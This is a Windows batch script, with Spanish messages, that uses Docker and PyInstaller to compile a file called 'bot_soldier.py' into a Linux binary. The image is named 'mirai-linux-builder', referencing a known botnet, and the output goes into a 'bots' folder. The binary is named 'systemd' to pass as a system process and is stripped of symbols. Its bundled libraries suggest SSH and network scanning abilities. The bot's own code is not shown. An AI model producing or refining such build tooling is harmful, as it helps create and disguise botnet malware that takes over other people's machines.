@echo off
cls
echo ========================================
echo   COMPILACION PARA LINUX (via Docker)
echo ========================================
echo.

REM Verificar Docker
docker --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Docker no esta instalado o no esta corriendo
    echo [*] Instala Docker Desktop desde: https://www.docker.com/products/docker-desktop
    pause
    exit /b 1
)

echo [1] Verificando archivos...
if not exist "bot_soldier.py" (
    echo [!] bot_soldier.py no encontrado
    pause
    exit /b 1
)
echo     [OK] bot_soldier.py encontrado
echo.

echo [2] Creando directorio de salida...
if not exist "bots\linux\x86_64" mkdir "bots\linux\x86_64"
echo     [OK] Directorio creado
echo.

echo [3] Creando Dockerfile temporal...
(
echo FROM python:3.11-slim
echo.
echo WORKDIR /app
echo.
echo # Instalar dependencias del sistema
echo RUN apt-get update ^&^& apt-get install -y \
echo     gcc \
echo     binutils \
echo     upx \
echo     ^&^& rm -rf /var/lib/apt/lists/*
echo.
echo # Copiar archivo bot
echo COPY bot_soldier.py /app/
echo.
echo # Instalar dependencias Python
echo RUN pip install --no-cache-dir pyinstaller paramiko netaddr cryptography scapy
echo.
echo # Compilar
echo RUN pyinstaller --onefile \
echo     --name systemd \
echo     --strip \
echo     --clean \
echo     bot_soldier.py
echo.
echo # Comando por defecto
echo CMD ["cp", "/app/dist/systemd", "/output/systemd"]
) > Dockerfile.build

echo     [OK] Dockerfile creado
echo.

echo [4] Construyendo imagen Docker...
echo     [*] Esto puede tomar 5-10 minutos la primera vez...
docker build -t mirai-linux-builder -f Dockerfile.build . 2>&1 | findstr /C:"Successfully" /C:"ERROR" /C:"error"
if %errorlevel% neq 0 (
    echo [!] Error construyendo imagen
    pause
    exit /b 1
)
echo     [OK] Imagen creada
echo.

echo [5] Compilando binario Linux...
docker run --rm -v "%cd%\bots\linux\x86_64:/output" mirai-linux-builder
if %errorlevel% neq 0 (
    echo [!] Error compilando binario
    pause
    exit /b 1
)
echo.

echo [6] Verificando binario...
if exist "bots\linux\x86_64\systemd" (
    echo     [OK] Binario Linux creado
    dir "bots\linux\x86_64\systemd" | findstr /C:"systemd"
) else (
    echo [!] Binario no se creo correctamente
    pause
    exit /b 1
)
echo.

echo ========================================
echo   COMPILACION LINUX EXITOSA!
echo ========================================
echo.
echo [+] Binario Linux: bots\linux\x86_64\systemd
echo [+] Tipo: ELF 64-bit Linux
echo.
echo [*] Limpiando archivos temporales...
del Dockerfile.build 2>nul
echo.
pause
